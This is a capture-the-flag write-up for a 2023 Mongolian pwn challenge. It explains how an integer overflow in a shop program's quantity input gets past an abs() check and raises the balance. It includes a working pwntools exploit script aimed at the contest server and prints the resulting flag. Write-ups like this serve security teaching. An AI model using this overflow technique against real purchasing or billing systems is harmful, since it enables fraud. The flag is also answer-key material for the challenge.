## Description 
Дэлгүүр хэсэх үү?
Pwn · Харуул Занги: 2023 · Bilgee
Solved: 14 · Score: 909
Хэрэгтэй юм аа л авж байгаарай...

```nc 139.162.5.230 10245```

Files:

challenge
challenge.c

## Solution

Its seems that they tried to use `abs(count)` to couter act the fact that we can just enter negetive number to increase our balance.
but it does not solve the fact that we can do integer overflow to increase out balance so let's try doing that

```
INT_MAX = 2147483647
```
so by entering number higher than this we can manipulate our balance to increase
there is no such need to write code for this challenge but here is my script that finds the flag for me :)

```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'challenge',checksec=False)

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10245)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

context.log_level = 'critical'

io = start()

io.recvuntil(b">")
io.sendline(b"1")

io.recvuntil(b"? ")
io.sendline(b"2147483747")

io.recvuntil(b">")
io.sendline(b"4")

io.recvuntil(b": ")
flag = io.recvuntil(b"}")
io.recv()
print(flag.strip().decode())

io.interactive()
```
## Flag 
```
HZ2023{integer_overflowwwwwwwww_sqrrrrt_4ec961cebd44370b}
```